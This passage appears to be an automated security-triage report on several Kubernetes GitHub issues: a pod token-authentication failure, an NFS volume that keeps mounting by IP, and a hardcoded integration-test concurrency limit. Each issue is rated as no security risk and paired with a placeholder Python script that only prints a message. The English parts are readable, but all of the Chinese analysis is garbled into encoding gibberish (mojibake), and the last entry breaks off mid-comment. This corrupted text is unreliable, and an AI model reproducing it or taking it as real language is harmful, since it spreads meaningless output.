    *   å¦‚æœçŠ¶æ€ç æ˜¯ `200 OK`ï¼Œè¡¨ç¤ºè¯¥ç«¯ç‚¹æ˜¯å…¬å¼€å¯è®¿é—®çš„ï¼Œè¿™ä¸Issueæè¿°çš„æƒ…å†µç›¸åã€‚
    *   å¦‚æœçŠ¶æ€ç æ˜¯ `401 Unauthorized` æˆ– `403 Forbidden`ï¼Œåˆ™è¡¨ç¤ºè®¿é—®è¢«æ‹’ç»ï¼Œéœ€è¦èº«ä»½éªŒè¯ã€‚è¿™**éªŒè¯**äº†Issueä¸­æŠ¥å‘Šçš„è¡Œä¸ºã€‚è„šæœ¬ä¼šè¾“å‡ºä¿¡æ¯ç¡®è®¤è¿™ä¸€ç‚¹ï¼Œå¹¶å¼ºè°ƒè¿™æœ¬èº«ä¸æ˜¯å®‰å…¨æ¼æ´ï¼Œè€Œæ˜¯åˆè§„æ€§å’Œå…¼å®¹æ€§é—®é¢˜ã€‚
    *   å¦‚æœçŠ¶æ€ç æ˜¯ `404 Not Found`ï¼Œè¯´æ˜è¯¥è·¯å¾„ä¸å­˜åœ¨ï¼Œå¯èƒ½æ˜¯å› ä¸ºè¯¥Kubernetesé›†ç¾¤æ²¡æœ‰é…ç½®OIDCï¼Œæˆ–è€…ä½¿ç”¨äº†ä¸åŒçš„è·¯å¾„ã€‚
    *   å¯¹äºå…¶ä»–æ„å¤–çš„çŠ¶æ€ç ï¼Œè„šæœ¬ä¹Ÿä¼šè®°å½•ä¸‹æ¥ã€‚
6.  **é”™è¯¯å¤„ç†ä¸è¶…æ—¶**ï¼šè„šæœ¬åŒ…å«äº†å¯¹ç½‘ç»œè¿æ¥é”™è¯¯ã€è¯·æ±‚è¶…æ—¶ä»¥åŠåŠ è½½kubeconfigå¤±è´¥ç­‰å¸¸è§é—®é¢˜çš„åŸºæœ¬é”™è¯¯å¤„ç†ã€‚åŒæ—¶ï¼Œè®¾ç½®äº†æ•´ä¸ªè„šæœ¬çš„æ€»æ‰§è¡Œè¶…æ—¶ï¼Œä»¥ç¡®ä¿å…¶èƒ½åœ¨é™å®šæ—¶é—´å†…ç»“æŸã€‚
7.  **æ—¥å¿—è®°å½•**ï¼šä½¿ç”¨`logging`æ¨¡å—è¾“å‡ºæ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¿¡æ¯å’Œç»“æœï¼Œä¾¿äºè·Ÿè¸ªå’Œç†è§£è„šæœ¬çš„è¡Œä¸ºã€‚
8.  **éæ¼æ´åˆ©ç”¨**ï¼šè¯¥è„šæœ¬ä»…æ‰§è¡Œåªè¯»çš„HTTP GETè¯·æ±‚æ¥æ£€æŸ¥ç«¯ç‚¹çš„å¯è®¿é—®æ€§ï¼Œä¸æ¶‰åŠä»»ä½•ä¿®æ”¹æ“ä½œæˆ–æ¼æ´åˆ©ç”¨å°è¯•ã€‚å®ƒçš„ç›®çš„æ˜¯éªŒè¯Issueæè¿°çš„ç°è±¡æ˜¯å¦å­˜åœ¨äºç›®æ ‡ç¯å¢ƒä¸­ã€‚

**æ³¨æ„**ï¼šæ­¤è„šæœ¬èƒ½å¦æˆåŠŸéªŒè¯Issueå–å†³äºç›®æ ‡Kubernetesé›†ç¾¤æ˜¯å¦ç¡®å®é…ç½®äº†OIDCè®¤è¯ï¼Œå¹¶ä¸”å…¶APIæœåŠ¡å™¨æ˜¯å¦ç¡®å®å¦‚Issueæ‰€è¿°å¯¹å‘ç°ç«¯ç‚¹å¼ºåˆ¶æ‰§è¡Œäº†èº«ä»½éªŒè¯ã€‚å¦‚æœé›†ç¾¤æœªä½¿ç”¨OIDCæˆ–å…¶è¡Œä¸ºç¬¦åˆæ ‡å‡†ï¼ˆå…è®¸åŒ¿åè®¿é—®å‘ç°ç«¯ç‚¹ï¼‰ï¼Œåˆ™è„šæœ¬å°†æŠ¥å‘Šä¸åŒçš„ç»“æœã€‚

---


## Issue #130771 K8s cluster reports token timeout, even if the pod is rebuilt, it will still report an error

- Issue é“¾æ¥ï¼š[#130771](https://github.com/kubernetes/kubernetes/issues/130771)

### Issue å†…å®¹

#### What happened?

The pod encountered an abnormal crash during operation, unable to be pulled up, and reported token authentication failure

#### What did you expect to happen?

My first consideration is that the service time is not consistent, and even after adjustment, it is still abnormal. How can I further investigate

#### How can we reproduce it (as minimally and precisely as possible)?

none

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
v1.28.2
</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªKubernetesé›†ç¾¤ä¸­Podå› Tokenè®¤è¯å¤±è´¥è€Œæ— æ³•å¯åŠ¨çš„é—®é¢˜ã€‚ç”¨æˆ·æŠ¥å‘ŠPodå¼‚å¸¸å´©æºƒåæ— æ³•æ‹‰èµ·ï¼Œæ—¥å¿—æç¤ºTokenè®¤è¯å¤±è´¥ã€‚ç”¨æˆ·åˆæ­¥æ€€ç–‘æ˜¯æœåŠ¡æ—¶é—´ä¸ä¸€è‡´å¯¼è‡´ï¼Œä½†è°ƒæ•´åé—®é¢˜ä¾æ—§å­˜åœ¨ï¼Œå¯»æ±‚è¿›ä¸€æ­¥æ’æŸ¥æ–¹æ³•ã€‚

1.  **é—®é¢˜æ€§è´¨**: è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª**åŠŸèƒ½æ€§æˆ–é…ç½®æ€§é—®é¢˜**ï¼Œè€Œéè½¯ä»¶æœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚Tokenè®¤è¯å¤±è´¥æ˜¯Kubernetesä¸­å¸¸è§çš„è¿ç»´é—®é¢˜ï¼Œå¯èƒ½ç”±å¤šç§åŸå› å¼•èµ·ï¼Œä¾‹å¦‚ï¼š
    *   ServiceAccount Tokenè¿‡æœŸæˆ–è¢«åŠé”€ã€‚
    *   èŠ‚ç‚¹ä¸API Serverä¹‹é—´å­˜åœ¨æ˜¾è‘—çš„æ—¶é’Ÿæ¼‚ç§»ï¼ˆClock Skewï¼‰ã€‚
    *   ç½‘ç»œç­–ç•¥ï¼ˆNetwork Policyï¼‰é˜»æ­¢äº†Pod/Kubeletä¸API Serverçš„é€šä¿¡ã€‚
    *   API Serverçš„Tokenè®¤è¯ç›¸å…³ç»„ä»¶å‡ºç°é—®é¢˜ã€‚
    *   ServiceAccountæˆ–ç›¸å…³RBACæƒé™é…ç½®ä¸æ­£ç¡®ã€‚
    *   kubeletè¯ä¹¦é—®é¢˜å¯¼è‡´æ— æ³•æ­£å¸¸ä¸apiserveré€šä¿¡ä»¥éªŒè¯tokenã€‚

2.  **å®‰å…¨é£é™©**:
    *   æ ¹æ®Issueé£é™©åˆ¤æ–­æ ‡å‡†ç¬¬2æ¡ï¼Œè¯¥é—®é¢˜æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼‚å¸¸ï¼ˆè®¤è¯å¤±è´¥ï¼‰ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¯è¢«åˆ©ç”¨æ¥æå‡æƒé™ã€çªƒå–æ•°æ®æˆ–é€ æˆæ‹’ç»æœåŠ¡çš„å®‰å…¨æ¼æ´ã€‚
    *   æ ¹æ®Issueé£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œç”¨æˆ·åœ¨Issueä¸­å¹¶æœªæ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼Œå…¶æè¿°çš„é—®é¢˜æ˜¯é›†ç¾¤è¿è¡Œä¸­é‡åˆ°çš„æ•…éšœï¼Œè€Œéé¡¹ç›®æœ¬èº«å¼•å…¥çš„å®‰å…¨é£é™©ã€‚
    *   è™½ç„¶Tokenè®¤è¯å¤±è´¥å¯èƒ½ *æºäº* å®‰å…¨äº‹ä»¶ï¼ˆå¦‚Tokenè¢«æ¶æ„åŠé”€ï¼‰ï¼Œä½†Issueæœ¬èº«æŠ¥å‘Šçš„æ˜¯è®¤è¯å¤±è´¥è¿™ä¸€ *ç°è±¡*ï¼Œå¹¶éåˆ©ç”¨è¯¥ç°è±¡è¿›è¡Œæ”»å‡»çš„é€”å¾„ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©åœºæ™¯ï¼ˆæ ‡å‡†ç¬¬7æ¡ï¼‰ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·çš„æƒ…å†µï¼ˆæ ‡å‡†ç¬¬8æ¡ï¼‰ã€‚
    *   æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰çš„å¯èƒ½æ€§å­˜åœ¨ï¼ˆPodæ— æ³•è¿è¡Œï¼‰ï¼Œä½†å¹¶éç”±å¤–éƒ¨æ”»å‡»è€…åˆ©ç”¨æ¼æ´è§¦å‘ï¼Œè€Œæ˜¯ç³»ç»Ÿå†…éƒ¨çš„è®¤è¯æœºåˆ¶å¤±è´¥ï¼Œä¸”éœ€è¦æ’æŸ¥å…·ä½“åŸå› ï¼Œä¸ç¬¦åˆæ ‡å‡†ç¬¬5æ¡ä¸­å¯¹DoSé£é™©çš„åˆ¤æ–­ï¼ˆéœ€è¦æ”»å‡»è€…åˆ©ç”¨æ¼æ´ï¼‰ã€‚

3.  **ç»“è®º**: è¯¥IssueæŠ¥å‘Šçš„æ˜¯ä¸€ä¸ªéœ€è¦è¿ç»´æ’æŸ¥çš„æ•…éšœï¼Œä¸æ„æˆè½¯ä»¶æœ¬èº«çš„å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# Rationale:
# The issue describes a functional problem (token authentication failure) within a Kubernetes cluster,
# likely due to misconfiguration, clock skew, network issues, or internal component failures.
# This is not an exploitable security vulnerability based on the description.
# The user is asking for troubleshooting steps, not reporting a flaw that can be exploited.
# Therefore, the risk rating is "Not Involved", and a POC script to demonstrate an exploit
# is not applicable or necessary according to the requirements (POCs are for High Risk issues).
#
# A Python script cannot realistically reproduce the *internal cluster state* (like clock skew,
# specific network policies, API server issues, or revoked tokens) that would cause this specific
# authentication failure symptom without having direct administrative access and knowledge of the
# exact root cause, which is what the user is trying to find out.
#
# Hence, no POC script is provided.

print("é£é™©è¯„çº§ä¸º'ä¸æ¶‰åŠ'ï¼Œæ— éœ€ç”Ÿæˆå¤ç°è„šæœ¬ã€‚")
print("è¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªKubernetesé›†ç¾¤å†…éƒ¨çš„è®¤è¯å¤±è´¥é—®é¢˜ï¼Œé€šå¸¸ç”±é…ç½®é”™è¯¯ã€æ—¶é’Ÿä¸åŒæ­¥ã€ç½‘ç»œé—®é¢˜æˆ–ç»„ä»¶æ•…éšœå¼•èµ·ï¼Œè€Œéå¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªåœ¨Kubernetesç¯å¢ƒä¸­é‡åˆ°çš„å…¸å‹è¿ç»´é—®é¢˜â€”â€”Podå› Tokenè®¤è¯å¤±è´¥è€Œæ— æ³•å¯åŠ¨ã€‚è¿™é€šå¸¸æŒ‡å‘é›†ç¾¤å†…éƒ¨çš„é…ç½®ã€æ—¶é’ŸåŒæ­¥ã€ç½‘ç»œè¿æ¥æˆ–è®¤è¯ç»„ä»¶æœ¬èº«çš„é—®é¢˜ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¯ä»¥è¢«å¤–éƒ¨æ”»å‡»è€…åˆ©ç”¨æ¥å±å®³ç³»ç»Ÿå®‰å…¨çš„æ¼æ´ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤ç±»åŠŸèƒ½æ€§æ•…éšœæˆ–é…ç½®é—®é¢˜ä¸å±äºå®‰å…¨é£é™©èŒƒç•´ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

ç”±äºè¯¥é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œä¸”æ— æ³•é€šè¿‡ç®€å•çš„å¤–éƒ¨æ“ä½œå¤ç°å†…éƒ¨çš„è®¤è¯å¤±è´¥çŠ¶æ€ï¼ˆéœ€è¦æ¨¡æ‹Ÿç‰¹å®šçš„é›†ç¾¤å†…éƒ¨æ•…éšœæ¡ä»¶ï¼Œå¦‚æ—¶é’Ÿä¸åŒæ­¥ã€ç½‘ç»œéš”ç¦»æˆ–TokenåŠé”€ç­‰ï¼‰ï¼Œå› æ­¤ä¸é€‚ç”¨æä¾›å¤ç°POCè„šæœ¬ã€‚æä¾›çš„Pythonä»£ç ä»…æ‰“å°è¯´æ˜ï¼Œè¡¨æ˜è¯¥é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€POCã€‚

---


## Issue #130766 Regarding the mount issue when using NFS volume in workload

- Issue é“¾æ¥ï¼š[#130766](https://github.com/kubernetes/kubernetes/issues/130766)

### Issue å†…å®¹

#### What happened?

During the initial deployment of the Workload, the `volumes.nfs.server` configuration was set using an IP address. Later, I modified it to a Domain Name, but after rebuilding the Pod, it still displayed as an IP. The configuration only correctly displays as a Domain Name after changing the Domain Name resolution to point to a different IP and restarting the Pod.

![Image](https://github.com/user-attachments/assets/42222913-8e26-4508-83d8-e34c7cdc91fd)

#### What did you expect to happen?

Modify the workload's NFS volume server to a domain name. Even if the domain name is mapped to the same IP as before, the pod will still use the domain name after being rebuilt.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Installed Kubernetes cluster with v1.29.13.
2. Deploy a workload and mount an NFS volume, specifying the server as an IP.
3. Prepare a domain name that maps to the NFS server IP.
4. Modify the NFS volume server in the workload to use the domain name. The pod will be rebuilt but will still mount using the IP.
5. Change the domain name mapping to another NFS server IP.
6. Restart the pod, and it will correctly mount using the domain name.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
v1.29.13
```

</details>

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

Linux xxx 5.15.0-131-generic #141-Ubuntu SMP Fri Jan 10 21:18:28 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ Kubernetes å·¥ä½œè´Ÿè½½ä¸­ä½¿ç”¨ NFS å·æ—¶é‡åˆ°çš„é…ç½®æ›´æ–°é—®é¢˜ã€‚å…·ä½“è¡¨ç°ä¸ºï¼šå½“ `volumes.nfs.server` é…ç½®ä» IP åœ°å€ä¿®æ”¹ä¸ºåŸŸååï¼Œå³ä½¿ Pod é‡å»ºï¼ŒæŒ‚è½½ç‚¹ä»ç„¶æ˜¾ç¤ºä¸ºæ—§çš„ IP åœ°å€ã€‚åªæœ‰å½“è¯¥åŸŸåçš„ DNS è§£ææŒ‡å‘ä¸€ä¸ªæ–°çš„ IP åœ°å€å¹¶å†æ¬¡é‡å¯ Pod åï¼Œé…ç½®æ‰ä¼šæ­£ç¡®æ›´æ–°ä¸ºåŸŸåã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªé…ç½®ç”Ÿæ•ˆå»¶è¿Ÿæˆ–ç¼“å­˜å¯¼è‡´çš„è¡Œä¸ºä¸ä¸€è‡´é—®é¢˜ã€‚ç”¨æˆ·ä¿®æ”¹äº†å·¥ä½œè´Ÿè½½çš„é…ç½®ï¼ˆå°† NFS æœåŠ¡å™¨ä» IP æ”¹ä¸ºåŸŸåï¼‰ï¼Œä½†ç³»ç»Ÿï¼ˆå¯èƒ½æ˜¯ Kubelet æˆ– CSI é©±åŠ¨ï¼‰æ²¡æœ‰æŒ‰é¢„æœŸç«‹å³ä½¿ç”¨æ–°çš„åŸŸåè¿›è¡ŒæŒ‚è½½ï¼Œä¼¼ä¹æ˜¯ç¼“å­˜äº†æ—§çš„ IP åœ°å€æˆ–è€…è§£æç»“æœã€‚
2.  **å®‰å…¨å½±å“**ï¼š
    *   è¯¥è¡Œä¸ºæœ¬èº«ä¸ç›´æ¥å¼•å…¥æ–°çš„æ”»å‡»å‘é‡ã€‚å®ƒä¸ä¼šå¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€ä¿¡æ¯æ³„éœ²ï¼ˆé™¤äº†é…ç½®ä¸­æœ¬åº”æ˜¾ç¤ºçš„åŸŸåå˜æˆäº† IPï¼‰ã€æƒé™æå‡æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
    *   ç”¨æˆ·éœ€è¦æœ‰ä¿®æ”¹ Workload é…ç½®çš„æƒé™æ‰èƒ½è§¦å‘è¿™ä¸ªé—®é¢˜ã€‚è¿™æ˜¯ä¸€ä¸ªç®¡ç†å‘˜æˆ–å…·æœ‰éƒ¨ç½²æƒé™ç”¨æˆ·çš„æ“ä½œã€‚
    *   è™½ç„¶è¡Œä¸ºä¸ç¬¦åˆé¢„æœŸï¼Œå¯èƒ½å¯¼è‡´è¿ç»´å›°æƒ‘æˆ–æœåŠ¡è¿æ¥åˆ°é”™è¯¯çš„ï¼ˆæ—§ IPï¼‰NFS æœåŠ¡å™¨ï¼ˆå¦‚æœ IP å·²ç»å˜æ›´ï¼‰ï¼Œä½†è¿™å±äºåŠŸèƒ½æ€§ Bug æˆ–é…ç½®ç®¡ç†é—®é¢˜ï¼Œè€Œéå…¸å‹çš„å®‰å…¨æ¼æ´ã€‚
    *   æ²¡æœ‰æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆissue æäº¤è€…æ²¡æœ‰åœ¨æè¿°ä¸­æš´éœ²å‡­æ®ç­‰ï¼‰ã€æ‹’ç»æœåŠ¡ï¼ˆDoSï¼Œé™¤éé”™è¯¯åœ°è¿æ¥åˆ°ä¸å¯ç”¨çš„æ—§ IP å¯¼è‡´ Pod å¯åŠ¨å¤±è´¥ï¼Œä½†è¿™éœ€è¦ç‰¹å®šæ¡ä»¶ä¸”éä¸»åŠ¨æ”»å‡»ï¼‰ã€å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©åœºæ™¯ã€‚
    *   è¯¥é—®é¢˜å½±å“çš„æ˜¯é…ç½®è¯¥ Workload çš„ç”¨æˆ·ï¼Œä¸æ¶‰åŠè·¨ç”¨æˆ·æˆ–è·¨ç§Ÿæˆ·çš„å½±å“ã€‚
3.  **å¯¹ç…§æ ‡å‡†**ï¼š
    *   æ ‡å‡† 2 & 3ï¼šé—®é¢˜éå®‰å…¨é—®é¢˜ï¼Œä¸é€‚ç”¨ CVSS è¯„åˆ†ã€‚é£é™©åˆ¤æ–­ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚
    *   æ ‡å‡† 4ï¼šIssue æäº¤è€…çš„æ“ä½œï¼ˆä¿®æ”¹é…ç½®ï¼‰æ˜¯æ­£å¸¸çš„è¿ç»´æ“ä½œï¼Œå¹¶éæš´éœ²æ•æ„Ÿä¿¡æ¯æˆ–ä¸å½“æ“ä½œã€‚
    *   æ ‡å‡† 5, 6, 7, 8ï¼šå‡ä¸é€‚ç”¨ã€‚
    *   æ ‡å‡† 9ï¼šä¿¡æ¯è¶³å¤Ÿåˆ¤æ–­é—®é¢˜æ€§è´¨ã€‚

**ç»“è®º**ï¼šè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜ï¼Œä¸ Kubernetes æˆ–å…¶å­˜å‚¨æ’ä»¶å¤„ç† NFS å·é…ç½®æ›´æ–°çš„æ–¹å¼æœ‰å…³ï¼Œå¯èƒ½æ¶‰åŠ DNS è§£æç¼“å­˜æˆ–é…ç½®æ›´æ–°é€»è¾‘ã€‚å®ƒä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ ¹æ®é£é™©è¯„çº§ï¼Œè¯¥ Issue ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚
# é—®é¢˜æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œä¸å®‰å…¨æ¼æ´æ— å…³ã€‚
print("è¯¥ Issue è¢«è¯„å®šä¸º 'ä¸æ¶‰åŠ' å®‰å…¨é£é™©ï¼Œå› æ­¤ä¸ç”Ÿæˆ POC è„šæœ¬ã€‚")
print("è¯¥é—®é¢˜æ˜¯ä¸€ä¸ªå…³äº Kubernetes NFS Volume é…ç½®æ›´æ–°è¡Œä¸ºä¸ç¬¦åˆé¢„æœŸçš„åŠŸèƒ½æ€§é—®é¢˜ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿° Python è„šæœ¬å¹¶æœªå®ç°å¤ç°é€»è¾‘ã€‚æ ¹æ®åˆ†æï¼Œè¯¥ Issue æè¿°çš„é—®é¢˜æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§çš„ Bugï¼Œå³ Kubernetes åœ¨æ›´æ–° NFS å·é…ç½®æ—¶ï¼Œä» IP åœ°å€æ›´æ”¹ä¸ºåŸŸååï¼ŒæŒ‚è½½è¡Œä¸ºæœªæŒ‰é¢„æœŸç«‹å³åæ˜ è¯¥æ›´æ”¹ï¼Œå¯èƒ½ä¸å†…éƒ¨ç¼“å­˜æœºåˆ¶æœ‰å…³ã€‚è¿™ä¸ªé—®é¢˜ä¸æ¶‰åŠåˆ©ç”¨æ¼æ´è¿›è¡Œæ”»å‡»ã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²ç­‰å®‰å…¨é£é™©ï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚æŒ‰ç…§è¦æ±‚ï¼Œä»…å¯¹é«˜é£é™©é—®é¢˜æä¾›å¤ç°è„šæœ¬ï¼Œæ•…æ­¤å¤„ä»…æä¾›è¯´æ˜ï¼Œä¸ç”Ÿæˆå®é™…æ“ä½œ Kubernetes é›†ç¾¤ä»¥å¤ç°è¯¥åŠŸèƒ½æ€§é—®é¢˜çš„è„šæœ¬ã€‚

---


## Issue #130755 don't use hardcoded maxprocs for integration tests

- Issue é“¾æ¥ï¼š[#130755](https://github.com/kubernetes/kubernetes/issues/130755)

### Issue å†…å®¹

#### What happened?

https://github.com/search?q=repo%3Akubernetes%2Fkubernetes%20KUBE_INTEGRATION_TEST_MAX_CONCURRENCY&type=code

#### What did you expect to happen?

should work like the unit tests and auto detect the real limit
/assign


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æŒ‡å‡º Kubernetes çš„é›†æˆæµ‹è¯•ä¸­ä½¿ç”¨äº†ä¸€ä¸ªç¡¬ç¼–ç çš„ `KUBE_INTEGRATION_TEST_MAX_CONCURRENCY` å˜é‡æ¥é™åˆ¶æœ€å¤§å¹¶å‘è¿›ç¨‹æ•°ï¼ˆmaxprocsï¼‰ï¼Œå¹¶å»ºè®®åƒå•å…ƒæµ‹è¯•ä¸€æ ·è‡ªåŠ¨æ£€æµ‹ç³»ç»Ÿçš„å®é™…å¹¶å‘èƒ½åŠ›ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥é—®é¢˜æ˜¯å…³äºæµ‹è¯•æ¡†æ¶çš„é…ç½®å’Œæ•ˆç‡ã€‚ä½¿ç”¨ç¡¬ç¼–ç çš„å¹¶å‘æ•°å¯èƒ½å¯¼è‡´åœ¨èµ„æºè¾ƒå°‘çš„æœºå™¨ä¸Šè¿è¡Œæµ‹è¯•æ—¶å› èµ„æºè€—å°½è€Œå¤±è´¥ï¼Œæˆ–åœ¨èµ„æºå……è¶³çš„æœºå™¨ä¸Šæœªèƒ½å……åˆ†åˆ©ç”¨èµ„æºå¯¼è‡´æµ‹è¯•è¿è¡Œè¿‡æ…¢ã€‚è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª**æ€§èƒ½ä¼˜åŒ–**å’Œ**æµ‹è¯•ç¨³å®šæ€§**çš„é—®é¢˜ã€‚
2.  **å®‰å…¨å½±å“**ï¼šè¯¥é—®é¢˜æœ¬èº«ä¸æ¶‰åŠå…¸å‹çš„å®‰å…¨æ¼æ´ç±»å‹ï¼Œå¦‚è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)ã€è·¨ç«™è„šæœ¬ (XSS)ã€SQL æ³¨å…¥ã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²ï¼ˆç‰¹æŒ‡æ•æ„Ÿä¿¡æ¯æ³„éœ²ç»™æœªç»æˆæƒæ–¹ï¼‰ç­‰ã€‚å®ƒå½±å“çš„æ˜¯å¼€å‘å’Œæµ‹è¯•æµç¨‹çš„æ•ˆç‡å’Œç¨³å®šæ€§ã€‚
3.  **æ”»å‡»å‘é‡**ï¼šä¸å­˜åœ¨ç›´æ¥çš„æ”»å‡»å‘é‡ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨è¿™ä¸ªç¡¬ç¼–ç çš„å€¼æ¥æ”»å‡»è¿è¡Œä¸­çš„ Kubernetes é›†ç¾¤æˆ–è·å–æœªæˆæƒçš„è®¿é—®æƒé™ã€‚è¿™ä»…ä»…æ˜¯æµ‹è¯•ç¯å¢ƒä¸‹çš„ä¸€ä¸ªé…ç½®å‚æ•°ã€‚
4.  **DoS é£é™©**ï¼šè™½ç„¶ä¸æ°å½“çš„å¹¶å‘è®¾ç½®å¯èƒ½å¯¼è‡´æµ‹è¯•ç¯å¢ƒèµ„æºè€—å°½ï¼ˆä¸€ç§å½¢å¼çš„ DoSï¼‰ï¼Œä½†è¿™å‘ç”Ÿåœ¨å—æ§çš„æµ‹è¯•ç¯å¢ƒä¸­ï¼Œé€šå¸¸ç”±å¼€å‘è€…æˆ– CI/CD ç³»ç»Ÿè§¦å‘ã€‚æ ¹æ®æ ‡å‡† 5ï¼Œå³ä½¿è®¤ä¸ºè¿™æ˜¯ DoSï¼Œå®ƒä¹Ÿå‘ç”Ÿåœ¨æµ‹è¯•æ‰§è¡Œé˜¶æ®µï¼Œé€šå¸¸éœ€è¦æ‰§è¡Œæµ‹è¯•çš„æƒé™ï¼Œå¹¶ä¸”å½±å“çš„æ˜¯æµ‹è¯•æœ¬èº«çš„æ‰§è¡Œï¼Œè€Œéç”Ÿäº§æœåŠ¡ã€‚å› æ­¤ï¼Œä¸åº”è§†ä¸ºé«˜é£é™©ã€‚
5.  **ä¿¡æ¯æ³„éœ²**ï¼šIssue å†…å®¹å’Œæ ‡é¢˜æœ¬èº«æ²¡æœ‰æ³„éœ²ä»»ä½•æ•æ„Ÿä¿¡æ¯ã€‚GitHub æœç´¢é“¾æ¥æŒ‡å‘çš„æ˜¯å…¬å¼€ä»£ç åº“ä¸­çš„ä»£ç ï¼Œä¸åŒ…å«å‡­è¯æˆ–å…¶ä»–æ•æ„Ÿæ•°æ®ã€‚
6.  **å…¶ä»–é«˜é£é™©åœºæ™¯**ï¼šè¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒæˆ–å¤šç”¨æˆ·ç¯å¢ƒä¸‹çš„äº’ç›¸å½±å“ï¼ˆæ ‡å‡† 7ã€8ï¼‰ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªå½±å“æµ‹è¯•æ•ˆç‡å’Œç¨³å®šæ€§çš„é…ç½®é—®é¢˜ï¼Œå¹¶éå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚
# é—®é¢˜æ ¸å¿ƒæ˜¯ä»£ç åº“ä¸­æµ‹è¯•é…ç½®çš„ä¸€ä¸ªç¡¬ç¼–ç å€¼ï¼Œ
